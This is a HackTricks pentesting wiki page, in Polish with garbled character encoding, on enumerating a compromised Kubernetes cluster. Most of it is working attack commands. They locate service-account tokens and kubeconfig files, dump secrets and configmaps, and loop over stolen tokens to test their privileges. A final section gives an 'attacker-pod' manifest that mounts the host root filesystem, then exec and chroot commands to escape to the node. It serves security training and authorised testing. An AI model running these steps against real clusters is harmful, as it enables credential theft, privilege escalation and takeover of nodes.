# Kubernetes Enumeration

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Kubernetes Tokens

JeÅ›li masz skompromitowany dostÄ™p do maszyny, uÅ¼ytkownik moÅ¼e mieÄ‡ dostÄ™p do jakiejÅ› platformy Kubernetes. Token zazwyczaj znajduje siÄ™ w pliku wskazywanym przez **env var `KUBECONFIG`** lub **w `~/.kube`**.

W tym folderze moÅ¼esz znaleÅºÄ‡ pliki konfiguracyjne z **tokenami i konfiguracjami do poÅ‚Ä…czenia z serwerem API**. W tym folderze moÅ¼esz rÃ³wnieÅ¼ znaleÅºÄ‡ folder cache z informacjami wczeÅ›niej pobranymi.

JeÅ›li skompromitowaÅ‚eÅ› pod w Å›rodowisku Kubernetes, sÄ… inne miejsca, w ktÃ³rych moÅ¼esz znaleÅºÄ‡ tokeny i informacje o bieÅ¼Ä…cym Å›rodowisku K8:

### Service Account Tokens

Zanim przejdziesz dalej, jeÅ›li nie wiesz, co to jest usÅ‚uga w Kubernetes, sugerujÄ™ **przeczytaÄ‡ przynajmniej informacje o architekturze Kubernetes.**

Z dokumentacji Kubernetes [dokumentacja](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/#use-the-default-service-account-to-access-the-api-server):

_â€Kiedy tworzysz pod, jeÅ›li nie okreÅ›lisz konta usÅ‚ugi, automatycznie przypisywane jest_ domyÅ›lne _konto usÅ‚ugi w tej samej przestrzeni nazw.â€_

**ServiceAccount** to obiekt zarzÄ…dzany przez Kubernetes, uÅ¼ywany do zapewnienia toÅ¼samoÅ›ci dla procesÃ³w dziaÅ‚ajÄ…cych w podzie.\
KaÅ¼de konto usÅ‚ugi ma z nim powiÄ…zany sekret, a ten sekret zawiera token dostÄ™pu. Jest to JSON Web Token (JWT), metoda reprezentowania roszczeÅ„ w sposÃ³b bezpieczny miÄ™dzy dwiema stronami.

Zazwyczaj **jeden** z katalogÃ³w:

* `/run/secrets/kubernetes.io/serviceaccount`
* `/var/run/secrets/kubernetes.io/serviceaccount`
* `/secrets/kubernetes.io/serviceaccount`

zawiera pliki:

* **ca.crt**: To certyfikat CA do sprawdzania komunikacji Kubernetes
* **namespace**: Wskazuje bieÅ¼Ä…cÄ… przestrzeÅ„ nazw
* **token**: Zawiera **token usÅ‚ugi** bieÅ¼Ä…cego poda.

Teraz, gdy masz token, moÅ¼esz znaleÅºÄ‡ serwer API w zmiennej Å›rodowiskowej **`KUBECONFIG`**. Aby uzyskaÄ‡ wiÄ™cej informacji, uruchom `(env | set) | grep -i "kuber|kube`**`"`**

Token konta usÅ‚ugi jest podpisywany kluczem znajdujÄ…cym siÄ™ w pliku **sa.key** i weryfikowany przez **sa.pub**.

DomyÅ›lna lokalizacja w **Kubernetes**:

* /etc/kubernetes/pki

DomyÅ›lna lokalizacja w **Minikube**:

* /var/lib/localkube/certs

### Hot Pods

_**Hot pods to**_ pod, ktÃ³re zawierajÄ… token konta usÅ‚ugi z uprawnieniami. Token konta usÅ‚ugi z uprawnieniami to token, ktÃ³ry ma pozwolenie na wykonywanie uprzywilejowanych zadaÅ„, takich jak wyÅ›wietlanie sekretÃ³w, tworzenie podÃ³w itp.

## RBAC

JeÅ›li nie wiesz, co to jest **RBAC**, **przeczytaj tÄ™ sekcjÄ™**.

## Enumeration CheatSheet

Aby zenumerowaÄ‡ Å›rodowisko K8s, potrzebujesz kilku rzeczy:

* **waÅ¼nego tokena autoryzacyjnego**. W poprzedniej sekcji zobaczyliÅ›my, gdzie szukaÄ‡ tokena uÅ¼ytkownika i tokena konta usÅ‚ugi.
* **adresu (**_**https://host:port**_**) serwera API Kubernetes**. Zazwyczaj moÅ¼na go znaleÅºÄ‡ w zmiennych Å›rodowiskowych i/lub w pliku konfiguracyjnym kube.
* **Opcjonalnie**: **ca.crt do weryfikacji serwera API**. MoÅ¼na go znaleÅºÄ‡ w tych samych miejscach, w ktÃ³rych moÅ¼na znaleÅºÄ‡ token. Jest to przydatne do weryfikacji certyfikatu serwera API, ale uÅ¼ywajÄ…c `--insecure-skip-tls-verify` z `kubectl` lub `-k` z `curl`, nie bÄ™dziesz tego potrzebowaÄ‡.

MajÄ…c te szczegÃ³Å‚y, moÅ¼esz **enumerowaÄ‡ kubernetes**. JeÅ›li **API** z jakiegoÅ› powodu jest **dostÄ™pne** przez **Internet**, moÅ¼esz po prostu pobraÄ‡ te informacje i zenumerowaÄ‡ platformÄ™ z wÅ‚asnego hosta.

Jednak zazwyczaj **serwer API znajduje siÄ™ w wewnÄ™trznej sieci**, dlatego bÄ™dziesz musiaÅ‚ **utworzyÄ‡ tunel** przez skompromitowanÄ… maszynÄ™, aby uzyskaÄ‡ do niego dostÄ™p z wÅ‚asnej maszyny, lub moÅ¼esz **przesÅ‚aÄ‡** [**kubectl**](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux) binarny, lub uÅ¼yÄ‡ **`curl/wget/cokolwiek`** do wykonywania surowych Å¼Ä…daÅ„ HTTP do serwera API.

### Differences between `list` and `get` verbs

Z uprawnieniami **`get`** moÅ¼esz uzyskaÄ‡ dostÄ™p do informacji o konkretnych zasobach (_opcja `describe` w `kubectl`_) API:
```
GET /apis/apps/v1/namespaces/{namespace}/deployments/{name}
```
JeÅ›li masz uprawnienie **`list`**, moÅ¼esz wykonywaÄ‡ Å¼Ä…dania API, aby wylistowaÄ‡ dany typ zasobu (_`get` opcja w `kubectl`_):
```bash
#In a namespace
GET /apis/apps/v1/namespaces/{namespace}/deployments
#In all namespaces
GET /apis/apps/v1/deployments
```
JeÅ›li masz uprawnienia **`watch`**, moÅ¼esz wykonywaÄ‡ Å¼Ä…dania API w celu monitorowania zasobÃ³w:
```
GET /apis/apps/v1/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments/{name}  [DEPRECATED]
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments  [DEPRECATED]
GET /apis/apps/v1/watch/deployments  [DEPRECATED]
```
OtwierajÄ… poÅ‚Ä…czenie strumieniowe, ktÃ³re zwraca peÅ‚ny manifest Deploymentu za kaÅ¼dym razem, gdy siÄ™ zmienia (lub gdy zostaje utworzony nowy).

{% hint style="danger" %}
NastÄ™pujÄ…ce polecenia `kubectl` wskazujÄ…, jak wylistowaÄ‡ obiekty. JeÅ›li chcesz uzyskaÄ‡ dostÄ™p do danych, musisz uÅ¼yÄ‡ `describe` zamiast `get`
{% endhint %}

### UÅ¼ywajÄ…c curl

Z wnÄ™trza poda moÅ¼esz uÅ¼yÄ‡ kilku zmiennych Å›rodowiskowych:
```bash
export APISERVER=${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt
alias kurl="curl --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\""
# if kurl is still got cert Error, using -k option to solve this.
```
{% hint style="warning" %}
DomyÅ›lnie pod moÅ¼e **uzyskaÄ‡ dostÄ™p** do **serwera kube-api** w nazwie domeny **`kubernetes.default.svc`** i moÅ¼esz zobaczyÄ‡ sieÄ‡ kube w **`/etc/resolv.config`**, poniewaÅ¼ tutaj znajdziesz adres serwera DNS kubernetes (".1" w tym samym zakresie to punkt koÅ„cowy kube-api).
{% endhint %}

### UÅ¼ywanie kubectl

MajÄ…c token i adres serwera API, uÅ¼ywasz kubectl lub curl, aby uzyskaÄ‡ do niego dostÄ™p, jak wskazano tutaj:

DomyÅ›lnie, APISERVER komunikuje siÄ™ z schematem `https://`

{% code overflow="wrap" %}
```bash
alias k='kubectl --token=$TOKEN --server=https://$APISERVER --insecure-skip-tls-verify=true [--all-namespaces]' # Use --all-namespaces to always search in all namespaces
```
{% endcode %}

> jeÅ›li nie ma `https://` w adresie URL, moÅ¼esz otrzymaÄ‡ bÅ‚Ä…d podobny do Bad Request.

MoÅ¼esz znaleÅºÄ‡ [**oficjalnÄ… Å›ciÄ…gawkÄ™ kubectl tutaj**](https://kubernetes.io/docs/reference/kubectl/cheatsheet/). Celem poniÅ¼szych sekcji jest przedstawienie w uporzÄ…dkowany sposÃ³b rÃ³Å¼nych opcji do enumeracji i zrozumienia nowego K8s, do ktÃ³rego uzyskaÅ‚eÅ› dostÄ™p.

Aby znaleÅºÄ‡ Å¼Ä…danie HTTP, ktÃ³re wysyÅ‚a `kubectl`, moÅ¼esz uÅ¼yÄ‡ parametru `-v=8`

#### MitM kubectl - Proxyfying kubectl
```bash
# Launch burp
# Set proxy
export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=http://localhost:8080
# Launch kubectl
kubectl get namespace --insecure-skip-tls-verify=true
```
### Aktualna konfiguracja

{% tabs %}
{% tab title="Kubectl" %}
```bash
kubectl config get-users
kubectl config get-contexts
kubectl config get-clusters
kubectl config current-context

# Change namespace
kubectl config set-context --current --namespace=<namespace>
```
{% endtab %}
{% endtabs %}

JeÅ›li udaÅ‚o ci siÄ™ ukraÅ›Ä‡ dane logowania niektÃ³rych uÅ¼ytkownikÃ³w, moÅ¼esz **skonfigurowaÄ‡ je lokalnie** uÅ¼ywajÄ…c czegoÅ› takiego jak:
```bash
kubectl config set-credentials USER_NAME \
--auth-provider=oidc \
--auth-provider-arg=idp-issuer-url=( issuer url ) \
--auth-provider-arg=client-id=( your client id ) \
--auth-provider-arg=client-secret=( your client secret ) \
--auth-provider-arg=refresh-token=( your refresh token ) \
--auth-provider-arg=idp-certificate-authority=( path to your ca certificate ) \
--auth-provider-arg=id-token=( your id_token )
```
### Uzyskaj obsÅ‚ugiwane zasoby

DziÄ™ki tym informacjom bÄ™dziesz wiedzieÄ‡, wszystkie usÅ‚ugi, ktÃ³re moÅ¼esz wylistowaÄ‡

{% tabs %}
{% tab title="kubectl" %}
```bash
k api-resources --namespaced=true #Resources specific to a namespace
k api-resources --namespaced=false #Resources NOT specific to a namespace
```
{% endtab %}
{% endtabs %}

### Uzyskaj bieÅ¼Ä…ce uprawnienia

{% tabs %}
{% tab title="kubectl" %}
```bash
k auth can-i --list #Get privileges in general
k auth can-i --list -n custnamespace #Get privileves in custnamespace

# Get service account permissions
k auth can-i --list --as=system:serviceaccount:<namespace>:<sa_name> -n <namespace>
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -i -s -k -X $'POST' \
-H $'Content-Type: application/json' \
--data-binary $'{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"metadata\":{\"creationTimestamp\":null},\"spec\":{\"namespace\":\"default\"},\"status\":{\"resourceRules\":null,\"nonResourceRules\":null,\"incomplete\":false}}\x0a' \
"https://$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews"
```
{% endtab %}
{% endtabs %}

Innym sposobem na sprawdzenie swoich uprawnieÅ„ jest uÅ¼ycie narzÄ™dzia: [**https://github.com/corneliusweig/rakkess**](https://github.com/corneliusweig/rakkess)\*\*\*\*

MoÅ¼esz dowiedzieÄ‡ siÄ™ wiÄ™cej o **Kubernetes RBAC** w:

{% content-ref url="kubernetes-role-based-access-control-rbac.md" %}
[kubernetes-role-based-access-control-rbac.md](kubernetes-role-based-access-control-rbac.md)
{% endcontent-ref %}

**Gdy juÅ¼ wiesz, jakie uprawnienia** posiadasz, sprawdÅº nastÄ™pujÄ…cÄ… stronÄ™, aby dowiedzieÄ‡ siÄ™ **czy moÅ¼esz je wykorzystaÄ‡** do eskalacji uprawnieÅ„:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### Uzyskaj role innych

{% tabs %}
{% tab title="kubectl" %}
```bash
k get roles
k get clusterroles
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/roles?limit=500"
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/clusterroles?limit=500"
```
{% endtab %}
{% endtabs %}

### Pobierz przestrzenie nazw

Kubernetes wspiera **wiele wirtualnych klastrÃ³w** opartych na tym samym fizycznym klastrze. Te wirtualne klastry nazywane sÄ… **przestrzeniami nazw**.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get namespaces
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/
```
{% endtab %}
{% endtabs %}

### Uzyskaj sekrety

{% tabs %}
{% tab title="kubectl" %}
```bash
k get secrets -o yaml
k get secrets -o yaml -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/secrets/

kurl -v https://$APISERVER/api/v1/namespaces/custnamespace/secrets/
```
{% endtab %}
{% endtabs %}

JeÅ›li moÅ¼esz odczytaÄ‡ sekrety, moÅ¼esz uÅ¼yÄ‡ nastÄ™pujÄ…cych linii, aby uzyskaÄ‡ uprawnienia zwiÄ…zane z kaÅ¼dym tokenem:
```bash
for token in `k describe secrets -n kube-system | grep "token:" | cut -d " " -f 7`; do echo $token; k --token $token auth can-i --list; echo; done
```
### Uzyskaj konta serwisowe

Jak omÃ³wiono na poczÄ…tku tej strony **gdy pod jest uruchamiany, zazwyczaj przypisywane jest do niego konto serwisowe**. Dlatego lista kont serwisowych, ich uprawnieÅ„ i miejsc, w ktÃ³rych sÄ… uruchamiane, moÅ¼e umoÅ¼liwiÄ‡ uÅ¼ytkownikowi eskalacjÄ™ uprawnieÅ„.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get serviceaccounts
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/{namespace}/serviceaccounts
```
{% endtab %}
{% endtabs %}

### Pobierz wdroÅ¼enia

WdroÅ¼enia okreÅ›lajÄ… **komponenty**, ktÃ³re muszÄ… byÄ‡ **uruchomione**.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get deployments
k get deployments -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/deployments/
```
{% endtab %}
{% endtabs %}

### Pobierz Podsy

Podsy to rzeczywiste **kontenery**, ktÃ³re bÄ™dÄ… **uruchamiane**.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get pods
k get pods -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/pods/
```
{% endtab %}
{% endtabs %}

### Uzyskaj usÅ‚ugi

Kubernetes **usÅ‚ugi** sÄ… uÅ¼ywane do **ekspozycji usÅ‚ugi na okreÅ›lonym porcie i IP** (ktÃ³re bÄ™dÄ… dziaÅ‚aÄ‡ jako load balancer dla podÃ³w, ktÃ³re faktycznie oferujÄ… usÅ‚ugÄ™). To jest interesujÄ…ce, aby wiedzieÄ‡, gdzie moÅ¼na znaleÅºÄ‡ inne usÅ‚ugi, aby sprÃ³bowaÄ‡ zaatakowaÄ‡.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get services
k get services -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/services/
```
{% endtab %}
{% endtabs %}

### Pobierz wÄ™zÅ‚y

Pobierz wszystkie **wÄ™zÅ‚y skonfigurowane w klastrze**.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get nodes
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/nodes/
```
{% endtab %}
{% endtabs %}

### Pobierz DaemonSets

**DaeamonSets** pozwala zapewniÄ‡, Å¼e **konkretny pod dziaÅ‚a na wszystkich wÄ™zÅ‚ach** klastra (lub na wybranych). JeÅ›li usuniesz DaemonSet, pod'y nim zarzÄ…dzane rÃ³wnieÅ¼ zostanÄ… usuniÄ™te.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get daemonsets
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/apis/extensions/v1beta1/namespaces/default/daemonsets
```
{% endtab %}
{% endtabs %}

### Pobierz cronjob

Cron jobs pozwalajÄ… na zaplanowanie uruchomienia poda, ktÃ³ry wykona jakÄ…Å› akcjÄ™, przy uÅ¼yciu skÅ‚adni podobnej do crontab.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get cronjobs
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/apis/batch/v1beta1/namespaces/<namespace>/cronjobs
```
{% endtab %}
{% endtabs %}

### Pobierz configMap

configMap zawsze zawiera wiele informacji i plikÃ³w konfiguracyjnych, ktÃ³re sÄ… dostarczane do aplikacji dziaÅ‚ajÄ…cych w Kubernetes. Zwykle moÅ¼na znaleÅºÄ‡ wiele haseÅ‚, sekretÃ³w, tokenÃ³w, ktÃ³re sÄ… uÅ¼ywane do Å‚Ä…czenia siÄ™ i weryfikacji z innymi wewnÄ™trznymi/zewnÄ™trznymi usÅ‚ugami.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get configmaps # -n namespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/${NAMESPACE}/configmaps
```
{% endtab %}
{% endtabs %}

### Uzyskaj polityki sieciowe / Polityki sieciowe Cilium

{% tabs %}
{% tab title="Pierwsza zakÅ‚adka" %}
```bash
k get networkpolicies
k get CiliumNetworkPolicies
k get CiliumClusterwideNetworkPolicies
```
{% endtab %}
{% endtabs %}

### Pobierz wszystko / Wszystko

{% tabs %}
{% tab title="kubectl" %}
```bash
k get all
```
{% endtab %}
{% endtabs %}

### **Uzyskaj zuÅ¼ycie PodÃ³w**

{% tabs %}
{% tab title="kubectl" %}
```bash
k top pod --all-namespaces
```
{% endtab %}
{% endtabs %}

### Ucieczka z poda

JeÅ›li jesteÅ› w stanie tworzyÄ‡ nowe pody, moÅ¼esz byÄ‡ w stanie uciec z nich do wÄ™zÅ‚a. Aby to zrobiÄ‡, musisz stworzyÄ‡ nowy pod za pomocÄ… pliku yaml, przeÅ‚Ä…czyÄ‡ siÄ™ do utworzonego poda, a nastÄ™pnie wykonaÄ‡ chroot do systemu wÄ™zÅ‚a. MoÅ¼esz uÅ¼yÄ‡ juÅ¼ istniejÄ…cych podÃ³w jako odniesienia do pliku yaml, poniewaÅ¼ wyÅ›wietlajÄ… one istniejÄ…ce obrazy i Å›cieÅ¼ki.
```bash
kubectl get pod <name> [-n <namespace>] -o yaml
```
> jeÅ›li musisz utworzyÄ‡ pod na konkretnym wÄ™Åºle, moÅ¼esz uÅ¼yÄ‡ nastÄ™pujÄ…cego polecenia, aby uzyskaÄ‡ etykiety na wÄ™Åºle
>
> `k get nodes --show-labels`
>
> Zwykle kubernetes.io/hostname i node-role.kubernetes.io/master to dobre etykiety do wyboru.

NastÄ™pnie tworzysz swÃ³j plik attack.yaml
```yaml
apiVersion: v1
kind: Pod
metadata:
labels:
run: attacker-pod
name: attacker-pod
namespace: default
spec:
volumes:
- name: host-fs
hostPath:
path: /
containers:
- image: ubuntu
imagePullPolicy: Always
name: attacker-pod
command: ["/bin/sh", "-c", "sleep infinity"]
volumeMounts:
- name: host-fs
mountPath: /root
restartPolicy: Never
# nodeName and nodeSelector enable one of them when you need to create pod on the specific node
#nodeName: master
#nodeSelector:
#  kubernetes.io/hostname: master
# or using
#  node-role.kubernetes.io/master: ""
```
[oryginalne ÅºrÃ³dÅ‚o yaml](https://gist.github.com/abhisek/1909452a8ab9b8383a2e94f95ab0ccba)

Po tym tworzysz pod.
```bash
kubectl apply -f attacker.yaml [-n <namespace>]
```
Teraz moÅ¼esz przeÅ‚Ä…czyÄ‡ siÄ™ na utworzony pod w nastÄ™pujÄ…cy sposÃ³b
```bash
kubectl exec -it attacker-pod [-n <namespace>] -- sh # attacker-pod is the name defined in the yaml file
```
A na koniec chrootujesz do systemu wÄ™zÅ‚a.
```bash
chroot /root /bin/bash
```
Informacje uzyskane z: [Kubernetes Namespace Breakout using Insecure Host Path Volume â€” Part 1](https://blog.appsecco.com/kubernetes-namespace-breakout-using-insecure-host-path-volume-part-1-b382f2a6e216) [Attacking and Defending Kubernetes: Bust-A-Kube â€“ Episode 1](https://www.inguardians.com/attacking-and-defending-kubernetes-bust-a-kube-episode-1/)

## Odniesienia

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3" %}

{% hint style="success" %}
Ucz siÄ™ i Ä‡wicz Hacking AWS:<img src="../../.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image.png" alt="" data-size="line">\
Ucz siÄ™ i Ä‡wicz Hacking GCP: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* SprawdÅº [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel siÄ™ trikami hackingowymi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w github.

</details>
{% endhint %}
